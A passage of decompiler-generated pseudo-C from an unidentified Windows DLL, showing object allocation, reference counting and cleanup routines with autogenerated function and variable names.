        LOBYTE(v221) = 121;
        v78 = sub_1002F174(
                (int)v217,
                (int)v133,
                (int)v134,
                (int)v135,
                v136,
                v137,
                (void *)0xC8,
                hEvent,
                v139,
                v140,
                v141.dwLowDateTime,
                (volatile LONG *)v141.dwHighDateTime,
                (int)v142,
                v143);
      }
      else
      {
        v78 = 0;
      }
      v221 = 122;
      sub_1000728E(v210, v78);
      v221 = 124;
      if ( (v218 & 8) != 0 )
      {
        v218 &= ~8u;
        sub_1000780D(v182);
      }
      v217 = operator new(0x38u);
      LOBYTE(v221) = 125;
      if ( v217 )
      {
        sub_1000728E(v196, 0);
        LOBYTE(v221) = 126;
        v218 |= 0x10u;
        v143 = v79;
        v142 = v79;
        v219 = &v142;
        sub_1002D137(&phkResult.unused, &v142);
        v221 = 127;
        v141.dwHighDateTime = v80;
        v141.dwLowDateTime = v80;
        v207 = &v141;
        sub_1000A205(&v212, &v141);
        LOBYTE(v221) = 0x80;
        v140 = (int *)hEvent;
        v139 = 200;
        HIDWORD(v138) = 0xFFFF;
        LODWORD(v138) = sub_10029D4C();
        LOBYTE(v221) = 126;
        v81 = sub_1002D19E(
                (int)v217,
                1u,
                v138,
                WORD2(v138),
                (int *)v139,
                v140,
                v141.dwLowDateTime,
                (volatile LONG *)v141.dwHighDateTime,
                (int)v142,
                v143);
      }
      else
      {
        v81 = 0;
      }
      v221 = 129;
      sub_1000728E(v182, v81);
      v221 = 131;
      if ( (v218 & 0x10) != 0 )
      {
        v218 &= ~0x10u;
        sub_1000780D(v196);
      }
      v82 = operator new(0x3Cu);
      v219 = v82;
      LOBYTE(v221) = -124;
      if ( v82 )
        v83 = sub_1002EBDD(v159, (int)v82, &v215, v188, 0);
      else
        v83 = 0;
      LOBYTE(v221) = -125;
      sub_10039112(v167, v83);
      LOBYTE(v221) = -123;
      v84 = operator new(0x1Cu);
      v219 = v84;
      LOBYTE(v221) = -122;
      if ( v84 )
        v85 = sub_100289DB(v84);
      else
        v85 = 0;
      LOBYTE(v221) = -123;
      sub_10039112(v187, (int)v85);
      LOBYTE(v221) = -121;
      sub_1000728E(v196, 0);
      LOBYTE(v221) = -120;
      v143 = v86;
      v142 = v86;
      v219 = &v142;
      sub_1002D137((int *)v167, &v142);
      LOBYTE(v221) = -120;
      sub_10028920((_DWORD *)v187[0], (char)v142, (int)v143);
      LOBYTE(v221) = -121;
      sub_1000780D(v196);
      sub_1000728E(v196, 0);
      LOBYTE(v221) = -118;
      v143 = v87;
      v142 = v87;
      v219 = &v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = -118;
      sub_10028920((_DWORD *)v187[0], (char)v142, (int)v143);
      LOBYTE(v221) = -121;
      sub_1000780D(v196);
      v217 = operator new(0x38u);
      LOBYTE(v221) = -116;
      if ( v217 )
      {
        sub_1000728E(v183, 0);
        LOBYTE(v221) = -115;
        v218 |= 0x20u;
        v143 = v88;
        v142 = v88;
        v219 = &v142;
        sub_1002D137((int *)v187, &v142);
        v221 = 142;
        v141.dwHighDateTime = v89;
        v141.dwLowDateTime = v89;
        v207 = &v141;
        sub_1000A205(&v212, &v141);
        LOBYTE(v221) = -113;
        v140 = (int *)hEvent;
        v139 = 200;
        HIDWORD(v138) = 0xFFFF;
        LODWORD(v138) = sub_10029CE9();
        LOBYTE(v221) = -115;
        v90 = sub_1002D19E(
                (int)v217,
                0,
                v138,
                WORD2(v138),
                (int *)v139,
                v140,
                v141.dwLowDateTime,
                (volatile LONG *)v141.dwHighDateTime,
                (int)v142,
                v143);
      }
      else
      {
        v90 = 0;
      }
      v221 = 144;
      sub_1000728E(v196, v90);
      v221 = 146;
      if ( (v218 & 0x20) != 0 )
      {
        v218 &= ~0x20u;
        sub_1000780D(v183);
      }
      v91 = operator new(0x3Cu);
      v219 = v91;
      LOBYTE(v221) = -109;
      if ( v91 )
        v92 = sub_1002EBDD(v160, (int)v91, &v215, v188, 0);
      else
        v92 = 0;
      LOBYTE(v221) = -110;
      sub_10039112(v183, v92);
      LOBYTE(v221) = -108;
      v93 = operator new(0x1Cu);
      v219 = v93;
      LOBYTE(v221) = -107;
      if ( v93 )
        v94 = sub_100289DB(v93);
      else
        v94 = 0;
      LOBYTE(v221) = -108;
      sub_10039112(v191, (int)v94);
      LOBYTE(v221) = -106;
      sub_1000728E(v193, 0);
      LOBYTE(v221) = -105;
      v143 = v95;
      v142 = v95;
      v219 = &v142;
      sub_1002D137((int *)v183, &v142);
      LOBYTE(v221) = -105;
      sub_10028920((_DWORD *)v191[0], (char)v142, (int)v143);
      LOBYTE(v221) = -106;
      sub_1000780D(v193);
      sub_1000728E(v193, 0);
      LOBYTE(v221) = -103;
      v143 = v96;
      v142 = v96;
      v219 = &v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = -103;
      sub_10028920((_DWORD *)v191[0], (char)v142, (int)v143);
      LOBYTE(v221) = -106;
      sub_1000780D(v193);
      v217 = operator new(0x38u);
      LOBYTE(v221) = -101;
      if ( v217 )
      {
        sub_1000728E(v211, 0);
        LOBYTE(v221) = -100;
        v218 |= 0x40u;
        v143 = v97;
        v142 = v97;
        v219 = &v142;
        sub_1002D137((int *)v191, &v142);
        v221 = 157;
        v141.dwHighDateTime = v98;
        v141.dwLowDateTime = v98;
        v207 = &v141;
        sub_1000A205(&v212, &v141);
        LOBYTE(v221) = -98;
        v140 = (int *)hEvent;
        v139 = 200;
        HIDWORD(v138) = 0xFFFF;
        LODWORD(v138) = sub_10029DD6();
        LOBYTE(v221) = -100;
        v99 = sub_1002D19E(
                (int)v217,
                2u,
                v138,
                WORD2(v138),
                (int *)v139,
                v140,
                v141.dwLowDateTime,
                (volatile LONG *)v141.dwHighDateTime,
                (int)v142,
                v143);
      }
      else
      {
        v99 = 0;
      }
      v221 = 159;
      sub_1000728E(v193, v99);
      v221 = 161;
      if ( (v218 & 0x40) != 0 )
      {
        v218 &= ~0x40u;
        sub_1000780D(v211);
      }
      v100 = operator new(0x1Cu);
      v219 = v100;
      LOBYTE(v221) = -94;
      if ( v100 )
        v101 = sub_1002ABD3(v100);
      else
        v101 = 0;
      LOBYTE(v221) = -95;
      sub_10039112(v169, (int)v101);
      LOBYTE(v221) = -93;
      sub_1000728E(v211, 0);
      LOBYTE(v221) = -92;
      v143 = v102;
      v142 = v102;
      v219 = &v142;
      sub_1002D137((int *)v178, &v142);
      LOBYTE(v221) = -92;
      v103 = v169[0];
      sub_10028920((_DWORD *)v169[0], (char)v142, (int)v143);
      LOBYTE(v221) = -93;
      sub_1000780D(v211);
      sub_1000728E(v211, 0);
      LOBYTE(v221) = -90;
      v143 = v104;
      v142 = v104;
      v219 = &v142;
      sub_1002D137((int *)v186, &v142);
      LOBYTE(v221) = -90;
      sub_10028920(v103, (char)v142, (int)v143);
      LOBYTE(v221) = -93;
      sub_1000780D(v211);
      sub_1000728E(v211, 0);
      LOBYTE(v221) = -88;
      v143 = v105;
      v142 = v105;
      v219 = &v142;
      sub_1002D137((int *)v167, &v142);
      LOBYTE(v221) = -88;
      sub_10028920(v103, (char)v142, (int)v143);
      LOBYTE(v221) = -93;
      sub_1000780D(v211);
      sub_1000728E(v211, 0);
      LOBYTE(v221) = -86;
      v143 = v106;
      v142 = v106;
      v219 = &v142;
      sub_1002D137((int *)v191, &v142);
      LOBYTE(v221) = -86;
      sub_10028920(v103, (char)v142, (int)v143);
      LOBYTE(v221) = -93;
      sub_1000780D(v211);
      sub_1000728E(v211, 0);
      LOBYTE(v221) = -84;
      v143 = v107;
      v142 = v107;
      v219 = &v142;
      sub_1002D137(v165, &v142);
      LOBYTE(v221) = -84;
      sub_10028920(v103, (char)v142, (int)v143);
      LOBYTE(v221) = -93;
      sub_1000780D(v211);
      v108 = operator new(0x1Cu);
      v219 = v108;
      LOBYTE(v221) = -82;
      if ( v108 )
        v109 = sub_100289DB(v108);
      else
        v109 = 0;
      LOBYTE(v221) = -93;
      sub_10039112(v192, (int)v109);
      LOBYTE(v221) = -81;
      sub_1000728E(v211, 0);
      LOBYTE(v221) = -80;
      v143 = v110;
      v142 = v110;
      v219 = &v142;
      sub_1002D137((int *)v169, &v142);
      LOBYTE(v221) = -80;
      sub_10028920((_DWORD *)v192[0], (char)v142, (int)v143);
      LOBYTE(v221) = -81;
      sub_1000780D(v211);
      sub_1000728E(&v206, 0);
      LOBYTE(v221) = -78;
      v143 = v111;
      v142 = v111;
      v219 = &v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = -78;
      sub_10028920((_DWORD *)v192[0], (char)v142, (int)v143);
      LOBYTE(v221) = -81;
      sub_1000780D(&v206);
      v215.dwHighDateTime = (DWORD)operator new(0x2Cu);
      LOBYTE(v221) = -76;
      if ( v215.dwHighDateTime )
      {
        sub_1000728E(&v189, 0);
        LOBYTE(v221) = -75;
        v218 |= 0x80u;
        v143 = v112;
        v142 = v112;
        v219 = &v142;
        sub_1002D137((int *)v192, &v142);
        v221 = 182;
        v141.dwHighDateTime = v113;
        v141.dwLowDateTime = v113;
        v207 = &v141;
        sub_1000A205(&v212, &v141);
        LOBYTE(v221) = -73;
        LOBYTE(v217) = *(_BYTE *)(dword_101842F4 + 222) != 0;
        if ( *(_BYTE *)(dword_101842F4 + 223) )
          LOBYTE(v217) = (unsigned __int8)v217 | 2;
        if ( *(_BYTE *)(dword_101842F4 + 224) )
          LOBYTE(v217) = (unsigned __int8)v217 | 4;
        if ( *(_BYTE *)(dword_101842F4 + 225) )
          LOBYTE(v217) = (unsigned __int8)v217 | 8;
        if ( *(_BYTE *)(dword_101842F4 + 226) )
          LOBYTE(v217) = (unsigned __int8)v217 | 0x10;
        LOBYTE(v221) = -75;
        v114 = sub_1003051D(
                 v215.dwHighDateTime,
                 (char)v217,
                 (wchar_t *)0x14,
                 v141.dwLowDateTime,
                 (volatile LONG *)v141.dwHighDateTime,
                 (int)v142,
                 v143);
      }
      else
      {
        v114 = 0;
      }
      v221 = 184;
      sub_1000728E(v211, v114);
      v221 = 186;
      if ( (v218 & 0x80u) != 0 )
      {
        v218 &= ~0x80u;
        sub_1000780D(&v189);
      }
      v215.dwHighDateTime = (DWORD)operator new(0x1Cu);
      LOBYTE(v221) = -69;
      if ( v215.dwHighDateTime )
      {
        sub_1000728E(&v189, 0);
        LOBYTE(v221) = -68;
        v218 |= 0x100u;
        v143 = v115;
        v142 = v115;
        v219 = &v142;
        sub_1002D137((int *)v192, &v142);
        v221 = 189;
        v141.dwHighDateTime = v116;
        v141.dwLowDateTime = v116;
        v207 = &v141;
        sub_1000A205(&v212, &v141);
        LOBYTE(v221) = -68;
        v117 = sub_10035573(
                 (_DWORD *)v215.dwHighDateTime,
                 v141.dwLowDateTime,
                 (volatile LONG *)v141.dwHighDateTime,
                 (int)v142,
                 v143);
      }
      else
      {
        v117 = 0;
      }
      v221 = 191;
      sub_1000728E(&v216, (int)v117);
      v221 = 193;
      if ( (v218 & 0x100) != 0 )
      {
        v218 &= ~0x100u;
        sub_1000780D(&v189);
      }
      if ( v163[1] )
      {
        sub_1000728E(&v206, 0);
        LOBYTE(v221) = -62;
        v143 = v119;
        v142 = v119;
        v219 = &v142;
        sub_1002D137((int *)v174, &v142);
        LOBYTE(v221) = -62;
        sub_10030A49(*(int *)v208, (int)v142, (int)v143);
        LOBYTE(v221) = -63;
        sub_1000780D(&v206);
      }
      if ( v159[1] )
      {
        v143 = v118;
        v142 = v118;
        v219 = &v142;
        sub_1000A205(v196, &v142);
        LOBYTE(v221) = -63;
        sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      }
      if ( v160[1] )
      {
        v143 = v118;
        v142 = v118;
        v219 = &v142;
        sub_1000A205(v193, &v142);
        LOBYTE(v221) = -63;
        sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      }
      if ( v162 )
      {
        v143 = v118;
        v142 = v118;
        v219 = &v142;
        sub_1000A205(v182, &v142);
        LOBYTE(v221) = -63;
        sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      }
      v120 = v162;
      if ( (int *)((char *)v162 + v158[1]) )
      {
        v143 = v162;
        v142 = v162;
        v219 = &v142;
        sub_1000A205(v210, &v142);
        LOBYTE(v221) = -63;
        sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      }
      v143 = v120;
      v142 = v120;
      v219 = &v142;
      sub_1000A205(&v216, &v142);
      LOBYTE(v221) = -63;
      sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      v143 = v121;
      v142 = v121;
      v219 = &v142;
      sub_1000A205(v211, &v142);
      LOBYTE(v221) = -63;
      sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      v143 = v122;
      v142 = v122;
      v219 = &v142;
      sub_1000A205(v198, &v142);
      LOBYTE(v221) = -63;
      sub_10030A49(*(int *)v208, (int)v142, (int)v143);
      v123 = sub_1000B261(dword_101842F4 + 8, (int)v151, 0);
      LOBYTE(v221) = -53;
      (*(void (__thiscall **)(wchar_t *, int, int))(*(_DWORD *)v212 + 4))(v212, v123, 222);
      LOBYTE(v221) = -63;
      sub_1000B3DF(v151);
      v141 = v156;
      v140 = v124;
      v139 = (int)v124;
      v219 = &v139;
      sub_1000A205(&v212, &v139);
      LOBYTE(v221) = -52;
      v207 = &v138;
      v138 = v201;
      InterlockedIncrement((volatile LONG *)HIDWORD(v201));
      LOBYTE(v221) = -51;
      v190 = &v134;
      sub_100298D1(v164, &v134);
      LOBYTE(v221) = -50;
      v215.dwHighDateTime = (DWORD)&v132;
      v133 = v209;
      v132 = *(volatile LONG **)v208;
      InterlockedIncrement(v209);
      LOBYTE(v221) = -49;
      v131 = *(_DWORD *)(dword_101842F4 + 20);
      LOBYTE(v221) = -63;
      sub_1002A7CB(
        v150,
        dword_101842F4 + 40,
        v131,
        v132,
        v133,
        (int)v134,
        (int)v135,
        v136,
        v137,
        v138,
        v139,
        v140,
        v141.dwLowDateTime,
        v141.dwHighDateTime);
      v219 = &v141;
      sub_1000A205(&v212, &v141);
      LOBYTE(v221) = -63;
      v125 = sub_10029EAA(dword_101842F4 + 40, dword_101842F4 + 40, v141.dwLowDateTime);
      v141.dwHighDateTime = 7;
      if ( !v125 )
      {
        dwHighDateTime = v141.dwHighDateTime;
        v150[0] = v141.dwHighDateTime;
        qmemcpy(v214, v150, 4 * v141.dwHighDateTime);
        LOBYTE(v221) = -70;
        sub_1000780D(&v216);
        LOBYTE(v221) = -81;
        sub_1000780D(v211);
        LOBYTE(v221) = -93;
        sub_1003406C(v192);
        LOBYTE(v221) = -95;
        sub_1003406C(v169);
        LOBYTE(v221) = -106;
        sub_1000780D(v193);
        LOBYTE(v221) = -108;
        sub_1003406C(v191);
        LOBYTE(v221) = -110;
        sub_1003406C(v183);
        LOBYTE(v221) = -121;
        sub_1000780D(v196);
        LOBYTE(v221) = -123;
        sub_1003406C(v187);
        LOBYTE(v221) = -125;
        sub_1003406C(v167);
        LOBYTE(v221) = 124;
        sub_1000780D(v182);
        LOBYTE(v221) = 111;
        sub_1000780D(v210);
        LOBYTE(v221) = 105;
        sub_1003406C(v180);
        LOBYTE(v221) = 99;
        sub_1003406C((void **)&phkResult);
        LOBYTE(v221) = 97;
        sub_1003406C(v184);
        LOBYTE(v221) = 89;
        sub_1000780D(&v204);
        LOBYTE(v221) = 88;
        sub_100068A5(v177);
        LOBYTE(v221) = 86;
        sub_1003406C(v186);
        LOBYTE(v221) = 84;
        sub_1003406C(v195);
        LOBYTE(v221) = 68;
        sub_1003406C(v174);
        LOBYTE(v221) = 66;
        sub_1003406C(v185);
        LOBYTE(v221) = 64;
        sub_1003406C(v178);
        LOBYTE(v221) = 51;
        sub_1000780D(v198);
        LOBYTE(v221) = 49;
        sub_1003406C(v181);
        LOBYTE(v221) = 47;
        sub_1000780D(v165);
        LOBYTE(v221) = 44;
        sub_1003406C((void **)&v201);
        LOBYTE(v221) = 42;
        sub_1003406C((void **)v208);
        LOBYTE(v221) = 41;
        sub_1000780D(v176);
        LOBYTE(v221) = 25;
        sub_1002987A(v164);
        LOBYTE(v221) = 23;
        sub_1000780D(&v199);
        LOBYTE(v221) = 21;
        sub_100068A5(v188);
        LOBYTE(v221) = 19;
        sub_100068A5(v160);
        LOBYTE(v221) = 17;
        sub_100068A5(v159);
        LOBYTE(v221) = 15;
        sub_100068A5(v155);
        LOBYTE(v221) = 13;
        sub_100068A5(v158);
        LOBYTE(v221) = 11;
        sub_100068A5(&v161);
        LOBYTE(v221) = dwHighDateTime;
        goto LABEL_44;
      }
      qmemcpy(v214, v150, 4 * v141.dwHighDateTime);
      LOBYTE(v221) = -70;
      sub_1000780D(&v216);
      LOBYTE(v221) = -81;
      sub_1000780D(v211);
      LOBYTE(v221) = -93;
      sub_1003406C(v192);
      LOBYTE(v221) = -95;
      sub_1003406C(v169);
      LOBYTE(v221) = -106;
      sub_1000780D(v193);
      LOBYTE(v221) = -108;
      sub_1003406C(v191);
      LOBYTE(v221) = -110;
      sub_1003406C(v183);
      LOBYTE(v221) = -121;
      sub_1000780D(v196);
      LOBYTE(v221) = -123;
      sub_1003406C(v187);
      LOBYTE(v221) = -125;
      sub_1003406C(v167);
      LOBYTE(v221) = 124;
      sub_1000780D(v182);
      LOBYTE(v221) = 111;
      sub_1000780D(v210);
      LOBYTE(v221) = 105;
      sub_1003406C(v180);
      LOBYTE(v221) = 99;
      sub_1003406C((void **)&phkResult);
      LOBYTE(v221) = 97;
      sub_1003406C(v184);
      LOBYTE(v221) = 89;
      sub_1000780D(&v204);
      LOBYTE(v221) = 88;
      sub_100068A5(v177);
      LOBYTE(v221) = 86;
      sub_1003406C(v186);
      LOBYTE(v221) = 84;
      sub_1003406C(v195);
      LOBYTE(v221) = 68;
      sub_1003406C(v174);
      LOBYTE(v221) = 66;
      sub_1003406C(v185);
      LOBYTE(v221) = 64;
      sub_1003406C(v178);
      LOBYTE(v221) = 51;
      sub_1000780D(v198);
      LOBYTE(v221) = 49;
      sub_1003406C(v181);
      LOBYTE(v221) = 47;
      sub_1000780D(v165);
    }
    else
    {
      v153[0] = 11;
      qmemcpy(v214, v153, 0x1Cu);
    }
    LOBYTE(v221) = 44;
    sub_1003406C((void **)&v201);
    LOBYTE(v221) = 42;
    sub_1003406C((void **)v208);
    LOBYTE(v221) = 41;
    sub_1000780D(v176);
  }
  else
  {
    v153[0] = 15;
    qmemcpy(v214, v153, 0x1Cu);
  }
  LOBYTE(v221) = 25;
  sub_1002987A(v164);
  LOBYTE(v221) = 23;
  sub_1000780D(&v199);
  LOBYTE(v221) = 21;
  sub_100068A5(v188);
  LOBYTE(v221) = 19;
  sub_100068A5(v160);
  LOBYTE(v221) = 17;
  sub_100068A5(v159);
  LOBYTE(v221) = 15;
  sub_100068A5(v155);
  LOBYTE(v221) = 13;
  sub_100068A5(v158);
  LOBYTE(v221) = 11;
  sub_100068A5(&v161);
  LOBYTE(v221) = 7;
LABEL_44:
  sub_100068A5(v154);
  LOBYTE(v221) = 6;
  sub_100068A5(v163);
  LOBYTE(v221) = 5;
  sub_1004E0F8(&v148);
  v221 = -1;
  sub_1000780D(&v212);
  sub_1009FFCE();
}
// 1002AD67: variable 'v2' is possibly undefined
// 1002ADCD: variable 'v4' is possibly undefined
// 1002AEC6: variable 'v6' is possibly undefined
// 1002AF19: variable 'v7' is possibly undefined
// 1002AF8A: variable 'v9' is possibly undefined
// 1002AFF8: variable 'v11' is possibly undefined
// 1002B066: variable 'v13' is possibly undefined
// 1002B0D1: variable 'v15' is possibly undefined
// 1002B13F: variable 'v17' is possibly undefined
// 1002B1AD: variable 'v19' is possibly undefined
// 1002B218: variable 'v21' is possibly undefined
// 1002B286: variable 'v22' is possibly undefined
// 1002B2E9: variable 'v24' is possibly undefined
// 1002B2FD: variable 'v26' is possibly undefined
// 1002B39A: variable 'v29' is possibly undefined
// 1002B581: variable 'v32' is possibly undefined
// 1002B74A: variable 'v38' is possibly undefined
// 1002B782: variable 'v39' is possibly undefined
// 1002B839: variable 'v40' is possibly undefined
// 1002B856: variable 'v41' is possibly undefined
// 1002B995: variable 'v47' is possibly undefined
// 1002B9D9: variable 'v48' is possibly undefined
// 1002BA3E: variable 'v49' is possibly undefined
// 1002BA5B: variable 'v50' is possibly undefined
// 1002BE14: variable 'v66' is possibly undefined
// 1002BE58: variable 'v67' is possibly undefined
// 1002BED0: variable 'v70' is possibly undefined
// 1002BF14: variable 'v71' is possibly undefined
// 1002BF8C: variable 'v74' is possibly undefined
// 1002BFD0: variable 'v75' is possibly undefined
// 1002C04E: variable 'v76' is possibly undefined
// 1002C06B: variable 'v77' is possibly undefined
// 1002C11A: variable 'v79' is possibly undefined
// 1002C137: variable 'v80' is possibly undefined
// 1002C243: variable 'v86' is possibly undefined
// 1002C287: variable 'v87' is possibly undefined
// 1002C2E8: variable 'v88' is possibly undefined
// 1002C305: variable 'v89' is possibly undefined
// 1002C406: variable 'v95' is possibly undefined
// 1002C44A: variable 'v96' is possibly undefined
// 1002C4AB: variable 'v97' is possibly undefined
// 1002C4C8: variable 'v98' is possibly undefined
// 1002C581: variable 'v102' is possibly undefined
// 1002C5C7: variable 'v104' is possibly undefined
// 1002C607: variable 'v105' is possibly undefined
// 1002C647: variable 'v106' is possibly undefined
// 1002C687: variable 'v107' is possibly undefined
// 1002C6FB: variable 'v110' is possibly undefined
// 1002C73F: variable 'v111' is possibly undefined
// 1002C7A7: variable 'v112' is possibly undefined
// 1002C7C4: variable 'v113' is possibly undefined
// 1002C8B6: variable 'v115' is possibly undefined
// 1002C8D3: variable 'v116' is possibly undefined
// 1002C951: variable 'v119' is possibly undefined
// 1002C98E: variable 'v118' is possibly undefined
// 1002CA52: variable 'v120' is possibly undefined
// 1002CA7B: variable 'v121' is possibly undefined
// 1002CAA4: variable 'v122' is possibly undefined
// 1002CB13: variable 'v124' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 101842F4: using guessed type int dword_101842F4;
// 10186A88: using guessed type _DWORD dword_10186A88[2];
// 1002AD16: using guessed type int var_610[30];
// 1002AD16: using guessed type int var_550[4];
// 1002AD16: using guessed type int var_400[4];
// 1002AD16: using guessed type _DWORD var_3B8[2];
// 1002AD16: using guessed type _DWORD var_468[2];
// 1002AD16: using guessed type int var_460[4];
// 1002AD16: using guessed type _DWORD var_370[2];
// 1002AD16: using guessed type _DWORD var_430[2];
// 1002AD16: using guessed type _DWORD var_3C0[2];
// 1002AD16: using guessed type _DWORD var_3D8[2];
// 1002AD16: using guessed type _DWORD var_368[2];
// 1002AD16: using guessed type int var_590[5];

//----- (1002D064) --------------------------------------------------------
int *__usercall sub_1002D064@<eax>(int a1@<ecx>, int *a2@<ebx>)
{
  int v4; // [esp+Ch] [ebp-30h] BYREF
  int v5[8]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+38h] [ebp-4h]

  sub_1000132C(v5);
  v5[0] = sub_10029E46();
  if ( !v5[0] )
  {
    sub_10001236((LONG *)(dword_101842F4 + 44), (LONG *)(a1 + 4));
    if ( sub_10029F42(a1, &unk_100FF894, (void *)4) )
    {
      if ( sub_1004DD38(*(void **)(dword_101842F4 + 4), (void *)(dword_101842F4 + 108)) )
      {
        sub_1001200D(&v4);
        v6 = 0;
        sub_1002AD16(a2);
        v6 = -1;
        sub_10012076(&v4);
        return a2;
      }
      v5[0] = 8;
    }
    else
    {
      v5[0] = 7;
    }
  }
  qmemcpy(a2, v5, 0x1Cu);
  return a2;
}
// 101842F4: using guessed type int dword_101842F4;

//----- (1002D137) --------------------------------------------------------
_DWORD *__thiscall sub_1002D137(int *this, _DWORD *a2)
{
  sub_1002D165(this, a2);
  return a2;
}

//----- (1002D165) --------------------------------------------------------
_DWORD *__thiscall sub_1002D165(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1002D19E) --------------------------------------------------------
int __stdcall sub_1002D19E(
        int a1,
        unsigned int a2,
        int a3,
        unsigned __int16 a4,
        int *a5,
        int *a6,
        int a7,
        volatile LONG *a8,
        int a9,
        volatile LONG *lpAddend)
{
  int v10; // edi
  unsigned int v11; // ebx
  unsigned int v12; // eax
  _DWORD *v13; // eax
  int v14; // eax
  bool v15; // bl
  int v17; // [esp-18h] [ebp-48h] BYREF
  volatile LONG *v18; // [esp-14h] [ebp-44h]
  int *v19; // [esp-10h] [ebp-40h]
  int v20; // [esp-Ch] [ebp-3Ch] BYREF
  volatile LONG *v21; // [esp-8h] [ebp-38h]
  int v22; // [esp-4h] [ebp-34h]
  int v23[7]; // [esp+10h] [ebp-20h] BYREF
  int v24; // [esp+2Ch] [ebp-4h]

  v24 = 1;
  v22 = (int)a5;
  a5 = &v20;
  v21 = lpAddend;
  v20 = a9;
  InterlockedIncrement(lpAddend);
  LOBYTE(v24) = 2;
  v19 = a6;
  v10 = a7;
  a6 = &v17;
  v18 = a8;
  v17 = a7;
  InterlockedIncrement(a8);
  LOBYTE(v24) = 1;
  sub_1002E489((_DWORD *)a1, v17, v18, (int)v19, v20, v21, v22);
  LOBYTE(v24) = 4;
  v11 = a4;
  *(_DWORD *)(a1 + 28) = a2;
  *(_WORD *)(a1 + 32) = a3;
  v22 = 0;
  v21 = (volatile LONG *)(a1 + 36);
  *(_DWORD *)a1 = &off_10103294;
  sub_1000B1F3((void *)v11, (int)v21, (void *)v22);
  LOBYTE(v24) = 5;
  if ( v11 >= (*(int (__thiscall **)(int))(*(_DWORD *)v10 + 12))(v10) )
    v12 = (*(int (__thiscall **)(int))(*(_DWORD *)v10 + 12))(v10);
  else
    v12 = v11;
  if ( v12 < 6 )
  {
    v13 = sub_1000E7F7(&a3, 1, 0);
    LOBYTE(v24) = 6;
    v22 = 31;
    goto LABEL_6;
  }
  if ( a2 <= 2 )
  {
    HIBYTE(a3) = a3 & 1;
    v14 = sub_1000B1F3((void *)1, (int)v23, (char *)&a3 + 3);
    LOBYTE(v24) = 7;
    v15 = sub_1002E54C((_DWORD **)a1, v14) != 0;
    LOBYTE(v24) = 5;
    sub_1000B3DF(v23);
    if ( v15 )
    {
      v13 = sub_1000E7F7(&a4, 1, 0);
      LOBYTE(v24) = 8;
      v22 = 39;
LABEL_6:
      sub_10007882((int)v13);
    }
  }
  LOBYTE(v24) = 0;
  sub_1000780D(&a7);
  v24 = -1;
  sub_1000780D(&a9);
  return a1;
}
// 10103294: using guessed type int (__stdcall *off_10103294)(char);
// 1002D19E: using guessed type int var_20[7];

//----- (1002D2DB) --------------------------------------------------------
int *__thiscall sub_1002D2DB(int *this, char a2)
{
  sub_1000B3DF(this + 9);
  sub_1002E517(this);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1002D31A) --------------------------------------------------------
int __thiscall sub_1002D31A(int this, int *a2)
{
  int v3; // edi
  _DWORD *v4; // esi
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // eax
  void *v11; // eax
  Concurrency::details::UMSFreeThreadProxyFactory *v12; // eax
  void *v13; // eax
  void *v14; // eax
  void *v15; // eax
  int v16; // eax
  int v17; // edi
  unsigned __int16 v18; // bx
  int v19; // ecx
  int v20; // eax
  int v21[5]; // [esp+10h] [ebp-38h] BYREF
  int v22[3]; // [esp+24h] [ebp-24h] BYREF
  void *Block; // [esp+30h] [ebp-18h]
  int v24; // [esp+34h] [ebp-14h]
  int v25; // [esp+44h] [ebp-4h]
  _DWORD *v26; // [esp+50h] [ebp+8h]

  v24 = this;
  v3 = *a2;
  v4 = (_DWORD *)(this + 36);
  v26 = (_DWORD *)(this + 36);
  sub_1000B79B(this, (_DWORD *)(this + 36));
  sub_1000B713(v5, v4, 0, *(_DWORD *)(v3 + 616));
  v6 = operator new(4u);
  Block = v6;
  v25 = 0;
  if ( v6 )
  {
    v7 = 1;
    *v6 = 1;
  }
  else
  {
    v6 = 0;
    v7 = 1;
  }
  v22[1] = (int)v6;
  v22[0] = 0;
  v25 = 2;
  v8 = *(_DWORD *)(this + 28);
  if ( v8 )
  {
    v9 = v8 - 1;
    if ( v9 )
    {
      if ( v9 != 1 )
      {
LABEL_7:
        v25 = -1;
        sub_10044C74(v22);
        return v7;
      }
      v11 = operator new(0xB4u);
      Block = v11;
      LOBYTE(v25) = 6;
      if ( v11 )
      {
        v12 = sub_1003B05D((Concurrency::details::UMSFreeThreadProxyFactory *)v11, v3 + 600, *(_WORD *)(this + 32));
        goto LABEL_21;
      }
    }
    else
    {
      v13 = operator new(0x40u);
      Block = v13;
      LOBYTE(v25) = 5;
      if ( v13 )
      {
        v12 = sub_1003BC66((Concurrency::details::UMSFreeThreadProxyFactory *)v13, v3 + 600, *(_WORD *)(this + 32));
        goto LABEL_21;
      }
    }
  }
  else if ( sub_1000DE70(v3 + 608, (int)&unk_10186B70)
         || sub_1000DE70(v3 + 608, (int)&unk_10186BD8)
         || sub_1000DE70(v3 + 608, (int)&unk_10186B90)
         || sub_1000DE70(v3 + 608, (int)&unk_10186BC0) )
  {
    v15 = operator new(0x80u);
    Block = v15;
    LOBYTE(v25) = 3;
    if ( v15 )
    {
      v12 = sub_1003963B((Concurrency::details::UMSFreeThreadProxyFactory *)v15, v3 + 600, *(_WORD *)(this + 32));
      goto LABEL_21;
    }
  }
  else
  {
    v14 = operator new(0x3Cu);
    Block = v14;
    LOBYTE(v25) = 4;
    if ( v14 )
    {
      v12 = sub_1003C5E7((Concurrency::details::UMSFreeThreadProxyFactory *)v14, v3 + 600, *(_WORD *)(this + 32));
      goto LABEL_21;
    }
  }
  v12 = 0;
LABEL_21:
  LOBYTE(v25) = 2;
  sub_1002D574(v22, (int)v12);
